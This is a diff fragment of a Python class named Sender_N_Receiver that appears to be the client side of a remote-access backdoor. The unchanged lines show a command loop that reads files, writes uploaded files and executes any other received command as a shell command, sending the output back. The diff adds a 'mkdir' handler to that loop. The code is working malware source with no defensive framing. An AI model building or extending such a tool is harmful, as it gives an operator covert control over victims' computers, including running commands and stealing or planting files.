@@ -43,6 +43,13 @@ class Sender_N_Receiver:
             except Exception:
                 return b"[-]invaid command"
 
+        def make_directory(self, path):
+            try:
+                os.mkdir(path)
+                return b"[+]successfully Created"
+            except OSError as error:
+                return b"[-]error"
+
         def change_working_directory(self, path):
             try:
                 os.chdir(path)
@@ -76,6 +83,8 @@ class Sender_N_Receiver:
                     output = self.read_files(command[1])
                 elif command[0] == "upload":
                     output = self.write_files(command[1], command[2])
+                elif command[0] == "mkdir":
+                    output = self.make_directory(command[1])
                 else:
                     output = self.execute_commands(command)
                 self.reliable_send(output)
